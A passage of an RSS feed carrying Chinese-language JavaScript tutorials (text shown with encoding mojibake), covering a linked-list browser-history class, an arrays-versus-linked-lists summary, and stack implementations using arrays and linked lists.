      <span class="hljs-keyword">const</span> removeCount = <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-property">size</span> - <span class="hljs-number">1</span> - <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span>;
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; removeCount; i++) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">removeLast</span>();
      }
    }

    <span class="hljs-comment">// æ·»åŠ æ–°é¡µé¢åˆ°å†å²è®°å½•</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span> !== <span class="hljs-literal">null</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">addLast</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span>);
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span> = url;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-property">size</span>;

    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">printHistory</span>();
  }

  <span class="hljs-comment">// åé€€</span>
  <span class="hljs-title function_">back</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> &lt;= <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ— æ³•åé€€ï¼šå·²ç»æ˜¯ç¬¬ä¸€é¡µ'</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span>--;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span>);

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`åé€€åˆ°: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.current}</span>`</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">printHistory</span>();

    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span>;
  }

  <span class="hljs-comment">// å‰è¿›</span>
  <span class="hljs-title function_">forward</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-property">size</span> - <span class="hljs-number">1</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ— æ³•å‰è¿›ï¼šå·²ç»æ˜¯æœ€åä¸€é¡µ'</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span>++;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> === <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-property">size</span> ?
      <span class="hljs-string">'å½“å‰é¡µé¢'</span> : <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span>);

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å‰è¿›åˆ°: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.current}</span>`</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">printHistory</span>();

    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span>;
  }

  <span class="hljs-comment">// æŸ¥çœ‹å†å²è®°å½•</span>
  <span class="hljs-title function_">printHistory</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å†å²è®°å½•:'</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">url, index</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> marker = index === <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> ? <span class="hljs-string">'â† å½“å‰'</span> : <span class="hljs-string">''</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`  <span class="hljs-subst">${index + <span class="hljs-number">1</span>}</span>. <span class="hljs-subst">${url}</span> <span class="hljs-subst">${marker}</span>`</span>);
    });

    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> === <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-property">size</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`  å½“å‰: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.current}</span>`</span>);
    }
  }

  <span class="hljs-comment">// è·³è½¬åˆ°æŒ‡å®šå†å²</span>
  <span class="hljs-title function_">go</span>(<span class="hljs-params">index</span>) {
    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span> || index &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-property">size</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ— æ•ˆçš„å†å²ä½ç½®: <span class="hljs-subst">${index}</span>`</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> = index;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span> = index === <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-property">size</span> ?
      <span class="hljs-string">'å½“å‰é¡µé¢'</span> : <span class="hljs-variable language_">this</span>.<span class="hljs-property">history</span>.<span class="hljs-title function_">get</span>(index);

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è·³è½¬åˆ°: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.current}</span>`</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">printHistory</span>();

    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span>;
  }
}
</code></pre>
<h2 data-id="heading-20">æ ¸å¿ƒè¦ç‚¹æ€»ç»“</h2>
<h3 data-id="heading-21">æ•°ç»„ vs é“¾è¡¨çš„æœ¬è´¨å·®å¼‚</h3>
<ul>
<li>æ•°ç»„ï¼šè¿ç»­å†…å­˜ï¼Œéšæœºè®¿é—®å¿«(O(1))ï¼Œæ’å…¥åˆ é™¤æ…¢(O(n))</li>
<li>é“¾è¡¨ï¼šéè¿ç»­å†…å­˜ï¼Œéšæœºè®¿é—®æ…¢(O(n))ï¼Œæ’å…¥åˆ é™¤å¿«(O(1))</li>
<li>JavaScriptæ•°ç»„ï¼šæ˜¯ç‰¹æ®Šå¯¹è±¡ï¼ŒV8å¼•æ“ä¼šä¼˜åŒ–å­˜å‚¨æ–¹å¼</li>
</ul>
<h3 data-id="heading-22">å•å‘é“¾è¡¨ vs åŒå‘é“¾è¡¨</h3>
<ul>
<li>å•å‘é“¾è¡¨ï¼šæ¯ä¸ªèŠ‚ç‚¹åªæœ‰ä¸€ä¸ªæŒ‡é’ˆ(next)ï¼Œå†…å­˜å¼€é”€å°</li>
<li>åŒå‘é“¾è¡¨ï¼šæ¯ä¸ªèŠ‚ç‚¹æœ‰ä¸¤ä¸ªæŒ‡é’ˆ(prev, next)ï¼Œæ”¯æŒåŒå‘éå†</li>
<li>é€‰æ‹©ï¼šéœ€è¦åå‘æ“ä½œæ—¶ç”¨åŒå‘é“¾è¡¨ï¼Œå¦åˆ™ç”¨å•å‘é“¾è¡¨</li>
</ul>
<h2 data-id="heading-23">ç»“è¯­</h2>
<p>æ•°æ®ç»“æ„çš„é€‰æ‹©æ²¡æœ‰ç»å¯¹çš„å¯¹é”™ï¼Œåªæœ‰é€‚åˆä¸å¦ã€‚ç†è§£æ•°ç»„å’Œé“¾è¡¨çš„å·®å¼‚ï¼Œèƒ½å¸®åŠ©æˆ‘ä»¬åœ¨å®é™…å¼€å‘ä¸­åšå‡ºæ›´æ˜æ™ºçš„é€‰æ‹©ï¼Œå†™å‡ºæ›´é«˜æ•ˆçš„ä»£ç ã€‚å¯¹äºæ–‡ç« ä¸­é”™è¯¯çš„åœ°æ–¹æˆ–è€…æœ‰ä»»ä½•é—®é¢˜ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€è®¨è®ºï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScriptæ•°æ®ç»“æ„æ·±åº¦è§£æï¼šæ ˆã€é˜Ÿåˆ—ä¸æ ‘çš„å®ç°ä¸åº”ç”¨]]></title>    <link>https://juejin.cn/post/7604395865335627828</link>    <guid>https://juejin.cn/post/7604395865335627828</guid>    <pubDate>2026-02-09T09:53:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604395865335627828" data-draft-id="7604395865335611444" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScriptæ•°æ®ç»“æ„æ·±åº¦è§£æï¼šæ ˆã€é˜Ÿåˆ—ä¸æ ‘çš„å®ç°ä¸åº”ç”¨"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-02-09T09:53:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wuhen_n"/> <meta itemprop="url" content="https://juejin.cn/user/4149996261738233"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScriptæ•°æ®ç»“æ„æ·±åº¦è§£æï¼šæ ˆã€é˜Ÿåˆ—ä¸æ ‘çš„å®ç°ä¸åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4149996261738233/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wuhen_n
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:53:59.000Z" title="Mon Feb 09 2026 09:53:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å½“å‡½æ•°è°ƒç”¨å±‚å±‚åµŒå¥—ï¼ŒJavaScript å¼•æ“å¦‚ä½•ç®¡ç†è¿™äº›è°ƒç”¨ï¼Ÿå½“äº‹ä»¶å¾ªç¯å¤„ç†å¼‚æ­¥ä»»åŠ¡æ—¶ï¼ŒèƒŒåçš„æ•°æ®ç»“æ„æ˜¯ä»€ä¹ˆï¼Ÿæœ¬æ–‡å°†æ·±å…¥æ¢è®¨æ ˆã€é˜Ÿåˆ—å’Œæ ‘åœ¨å‰ç«¯å¼€å‘ä¸­çš„æ ¸å¿ƒåº”ç”¨ã€‚</p>
</blockquote>
<h2 data-id="heading-0">å‰è¨€ï¼šä»å‡½æ•°è°ƒç”¨è¯´èµ·</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¸€ä¸ªç®€å•çš„å‡½æ•°è°ƒç”¨æ ˆç¤ºä¾‹</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">funcA</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è¿›å…¥å‡½æ•°A'</span>);
    <span class="hljs-title function_">funcB</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç¦»å¼€å‡½æ•°A'</span>);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">funcB</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è¿›å…¥å‡½æ•°B'</span>);
    <span class="hljs-title function_">funcC</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç¦»å¼€å‡½æ•°B'</span>);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">funcC</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è¿›å…¥å‡½æ•°C'</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç¦»å¼€å‡½æ•°C'</span>);
}

<span class="hljs-title function_">funcA</span>();
</code></pre>
<p>è¿™æ®µä»£ç çš„è¾“å‡ºé¡ºåºæ˜¯ä»€ä¹ˆï¼Ÿ<code>è¿›å…¥å‡½æ•°A è¿›å…¥å‡½æ•°B è¿›å…¥å‡½æ•°C ç¦»å¼€å‡½æ•°C ç¦»å¼€å‡½æ•°B ç¦»å¼€å‡½æ•°A</code> ã€‚</p>
<p>è¿™ç§"å…ˆè¿›åå‡º"çš„æ‰§è¡Œé¡ºåºï¼Œæ­£æ˜¯<strong>æ ˆ</strong>çš„å…¸å‹ç‰¹å¾ã€‚</p>
<h2 data-id="heading-1">æ ˆï¼ˆStackï¼‰çš„å®ç°ä¸åº”ç”¨</h2>
<h3 data-id="heading-2">æ ˆçš„åŸºæœ¬æ¦‚å¿µ</h3>
<p><strong>æ ˆ</strong> æ˜¯ä¸€ç§<strong>åè¿›å…ˆå‡º</strong>ï¼ˆLIFOï¼‰çš„æ•°æ®ç»“æ„ï¼Œå°±åƒä¸€æ‘ç›˜å­ï¼Œæˆ‘ä»¬åªèƒ½ä»æœ€ä¸Šé¢å–æ”¾ç›˜å­ã€‚</p>
<h3 data-id="heading-3">æ ˆçš„æ“ä½œç¤ºæ„å›¾</h3>
<pre><code class="hljs language-text" lang="text">      push(3)      push(5)      pop() â†’ 5
â”Œâ”€â”€â”€â”    â†’    â”Œâ”€â”€â”€â”    â†’    â”Œâ”€â”€â”€â”    â†’    â”Œâ”€â”€â”€â”
â”‚   â”‚         â”‚ 3 â”‚         â”‚ 5 â”‚         â”‚ 3 â”‚
â”œâ”€â”€â”€â”¤         â”œâ”€â”€â”€â”¤         â”œâ”€â”€â”€â”¤         â”œâ”€â”€â”€â”¤
â”‚   â”‚         â”‚   â”‚         â”‚ 3 â”‚         â”‚   â”‚
â””â”€â”€â”€â”˜         â””â”€â”€â”€â”˜         â””â”€â”€â”€â”˜         â””â”€â”€â”€â”˜
 ç©ºæ ˆ          æ ˆåº•:3        æ ˆé¡¶:5        æ ˆåº•:3
</code></pre>
<h3 data-id="heading-4">ç”¨æ•°ç»„å®ç°æ ˆ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayStack</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">capacity = <span class="hljs-number">10</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(capacity);  <span class="hljs-comment">// åº•å±‚æ•°ç»„</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span> = -<span class="hljs-number">1</span>;                     <span class="hljs-comment">// æ ˆé¡¶æŒ‡é’ˆ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span> = capacity;          <span class="hljs-comment">// æ ˆå®¹é‡</span>
  }

  <span class="hljs-comment">// å…¥æ ˆæ“ä½œ</span>
  <span class="hljs-title function_">push</span>(<span class="hljs-params">element</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isFull</span>()) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'æ ˆå·²æ»¡'</span>);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span>++;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span>] = element;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// å‡ºæ ˆæ“ä½œ</span>
  <span class="hljs-title function_">pop</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'æ ˆä¸ºç©º'</span>);
    }
    <span class="hljs-keyword">const</span> element = <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span>];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span>] = <span class="hljs-literal">undefined</span>;  <span class="hljs-comment">// æ¸…ç†å¼•ç”¨</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span>--;
    <span class="hljs-keyword">return</span> element;
  }

  <span class="hljs-comment">// æŸ¥çœ‹æ ˆé¡¶å…ƒç´ ï¼ˆä¸å¼¹å‡ºï¼‰</span>
  <span class="hljs-title function_">peek</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span>];
  }

  <span class="hljs-comment">// åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©º</span>
  <span class="hljs-title function_">isEmpty</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span> === -<span class="hljs-number">1</span>;
  }

  <span class="hljs-comment">// åˆ¤æ–­æ ˆæ˜¯å¦å·²æ»¡</span>
  <span class="hljs-title function_">isFull</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span> === <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-comment">// è·å–æ ˆå¤§å°</span>
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">size</span>() {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span> + <span class="hljs-number">1</span>;
  }

  <span class="hljs-comment">// æ¸…ç©ºæ ˆ</span>
  <span class="hljs-title function_">clear</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span> = -<span class="hljs-number">1</span>;
  }
}
</code></pre>
<h3 data-id="heading-5">ç”¨é“¾è¡¨å®ç°æ ˆ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ListNode</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">value, next = <span class="hljs-literal">null</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = value;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">next</span> = next;
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedListStack</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span> = <span class="hljs-literal">null</span>;    <span class="hljs-comment">// æ ˆé¡¶èŠ‚ç‚¹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;    <span class="hljs-comment">// æ ˆé•¿åº¦</span>
  }

  <span class="hljs-comment">// å…¥æ ˆæ“ä½œ</span>
  <span class="hljs-title function_">push</span>(<span class="hljs-params">element</span>) {
    <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹ï¼ŒæŒ‡å‘åŸæ¥çš„æ ˆé¡¶</span>
    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListNode</span>(element, <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span> = newNode;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-comment">// å‡ºæ ˆæ“ä½œ</span>
  <span class="hljs-title function_">pop</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'æ ˆä¸ºç©º'</span>);
    }
    <span class="hljs-keyword">const</span> value = <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span>.<span class="hljs-property">value</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span>.<span class="hljs-property">next</span>;  <span class="hljs-comment">// ç§»åŠ¨æ ˆé¡¶æŒ‡é’ˆ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>--;
    <span class="hljs-keyword">return</span> value;
  }

  <span class="hljs-title function_">peek</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span>.<span class="hljs-property">value</span>;
  }

  <span class="hljs-title function_">isEmpty</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span> === <span class="hljs-literal">null</span>;
  }

  <span class="hljs-keyword">get</span> <span class="hljs-title function_">size</span>() {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>;
  }

  <span class="hljs-title function_">clear</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">top</span> = <span class="hljs-literal">null</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;
  }
}
</code></pre>
<h3 data-id="heading-6">æ•°ç»„æ ˆ vs é“¾è¡¨æ ˆ</h3>
<ul>
<li>æ•°ç»„æ ˆï¼šå†…å­˜è¿ç»­ï¼ŒCPUç¼“å­˜å‹å¥½ï¼Œè®¿é—®é€Ÿåº¦å¿«</li>
<li>é“¾è¡¨æ ˆï¼šåŠ¨æ€æ‰©å®¹ï¼Œæ— å®¹é‡é™åˆ¶ï¼Œä½†å†…å­˜ä¸è¿ç»­</li>
